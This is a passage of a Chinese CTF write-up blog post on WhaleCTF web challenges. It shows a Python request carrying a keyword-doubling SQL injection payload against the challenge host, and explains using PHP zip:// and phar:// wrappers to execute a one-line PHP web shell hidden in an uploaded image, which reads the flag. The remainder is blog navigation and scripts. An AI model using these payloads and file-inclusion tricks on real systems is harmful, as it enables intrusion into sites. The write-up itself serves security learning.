+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">"image=212 ununionion diisstinct selselectect 0x&#123;filename&#125; oisrorder by 1 desc&amp;image_download=%E6%94%B6%E8%97%8F"</span></span><br><span class="line">    url = <span class="string">"http://ctf.whaledu.com:10012/52gw5g4hvs59/downfile.php"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=a2ds5od7uidniglahrdt7u53v3"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>最后跑出文件名啦23333</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kG54ld.png" alt="kG54ld.png"></p>
+<p>复习一下php为协议里面的知识点，一个是phar一个是zip伪协议，这两个协议可以识别压缩包，并将压缩包里面的文件读取出来执行，所以我们就把一句话的php文件打包成压缩包，利用下面的协议去执行</p>
+<p>Zip协议：<code>file=zip://1.jpg%231.php</code>   注意这里zip使用<code>#</code>也就是<code>%23</code>分割，而phar使用的是<code>/</code>分割并且执行文件不加后缀名，因为源码里面已经包含了后缀名Phar协议为:<code>file=phar://1.jpg/1</code></p>
+<p>接下来就是用phar协议了,获得flag所在页面为<code>F1AgIsH3r3G00d.php</code>，file=phar://./Up10aDs/fvgdvan23vtfezk89ngad52bkhzvaio4.jpg/1</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kG5jpQ.png" alt="kG5jpQ.png"></p>
+<p> 打开发现什么都看不见，又想到一开始读文件的操作，于是再尝试发现，成功读取flag</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIEp4.png" alt="kGIEp4.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/whalectf-web2.html">WhaleCTF第二期打卡的web题</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2018-05-06, 14:59:48</p>
+        <p><span>最后更新:</span>2019-02-08, 16:38:52</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/whalectf-web2.html" title="WhaleCTF第二期打卡的web题">0verwatch.top/whalectf-web2.html</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/whalectf-web2.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/cumt-2018-final.html">
+                    cumt2018校赛部分write up
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/git-learning.html">
+                    Git学习笔记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+   
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>听说，打赏我的人最后都成了大佬。</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/img/wechatpay.jpg" alt="0verWatch WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/alipay.jpg" alt="0verWatch Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#登录无效"><span class="toc-number">1.</span> <span class="toc-text">登录无效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#瞎子摸鱼"><span class="toc-number">2.</span> <span class="toc-text">瞎子摸鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘的令牌"><span class="toc-number">3.</span> <span class="toc-text">神秘的令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蓝鲸相册系统"><span class="toc-number">4.</span> <span class="toc-text">蓝鲸相册系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蓝鲸文件管理系统"><span class="toc-number">5.</span> <span class="toc-text">蓝鲸文件管理系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蓝鲸笔记系统"><span class="toc-number">6.</span> <span class="toc-text">蓝鲸笔记系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蓝鲸相册展览"><span class="toc-number">7.</span> <span class="toc-text">蓝鲸相册展览</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+              
+        <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80MDk1Ny8xNzQ4Mg==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+       if (typeof LivereTower === 'function') { return; }
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>。 
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/cumt-2018-final.html" title="上一篇: cumt2018校赛部分write up">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/git-learning.html" title="下一篇: Git学习笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/anheng-1mongth.html">安恒一月赛做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Dockerfile-writing.html">Dockerfile编写</a></li><li class="post-list-item"><a class="post-list-link" href="/RC4-python.html">RC4的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/A5-python.html">A5的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/swpuctf-2018.html">swpuctf赛后复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-12month.html">安恒12月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-month-race.html">CUMT第一轮双月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-11month.html">安恒11月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-10month.html">安恒10月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/algorithm-review.html">算法上机考试复习</a></li><li class="post-list-item"><a class="post-list-link" href="/huwang-game.html">护网杯部分题目题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-CTF-Platform.html">CUMT平台的部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-9month.html">安恒9月部分赛题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirstv2.html">Hitcon2017 babyfirst-revenge v2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2015-babyfirst.html">Hitcon2015 babyfirst复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirst.html">Hitcon2017 babyfirst-revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/liuliangfenxi-5-5.html">铁三2018.5.5数据分析</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-8month-part1.html">安恒8月应急响应题目回顾</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-4.html">sqli-labs实战记录(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-3.html">sqli-labs实战记录(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-2.html">sqli-labs实战记录(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-1.html">sqli-labs实战记录(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/bin-search-sql.html">二分查找在sql盲注里面的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/Solve-Me-wp.html">Solve Me解题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-inject-protect.html">浅谈SQL注入防御手段</a></li><li class="post-list-item"><a class="post-list-link" href="/sqlmap-usage.html">Sqlmap 使用方法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-FW.html">Linux防火墙学习</a></li><li class="post-list-item"><a class="post-list-link" href="/Mysql-security-1.html">Mysql安全配置</a></li><li class="post-list-item"><a class="post-list-link" href="/pentest-1.html">记录一次模拟渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-2.html">计网实验笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-1.html">计网实验笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-exam.html">微机实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-experiment.html">微机实验记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-6month.html">安恒6月赛部分做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-2.html">数据结构复习二 双向链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-1.html">数据结构复习一 单链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/writing-1.html">两年</a></li><li class="post-list-item"><a class="post-list-link" href="/Yii-probleam.html">编写Yii框架项目时出现的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/susctf2018-wp.html">SUSCTF 2018 做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-CTFd-building.html">Docker练习及在CTFd平台上放题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTFd-building.html">CTFd平台搭建记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-learning.html">Docker学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC-2018-wp.html">ISCC 2018做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-5month.html">安恒5月赛web题目做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-2018-final.html">cumt2018校赛部分write up</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web2.html">WhaleCTF第二期打卡的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/git-learning.html">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP-Yii.html">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web1.html">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/shiyanba1-wp.html">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/phpcheck2.html">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTF-python.html">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/Ubantu-Web.html">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-php-fanxuliehua.html">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/RaceConditionsSummary.html">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/hash-length-attack.html">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/moctf-web.html">简单小结一下moctf的三道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/backup-blog-again.html">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/RSA-SimpleLearn.html">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/CRC32-Brute.html">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-learn.html">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-php-check.html">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Web-write-up.html">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Misc.html">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Crypto.html">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-social-wp.html">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/zipfalse.html">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/php-mysql-content.html">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-Summary.html">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/php summary.html">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work4.html">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work3.html">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work2.html">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work1.html">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2019 0verWatch
+
+            </div>
+            <div class="footer-right">
+                Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+                <span>|  Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+
+                
+
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-119588656-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
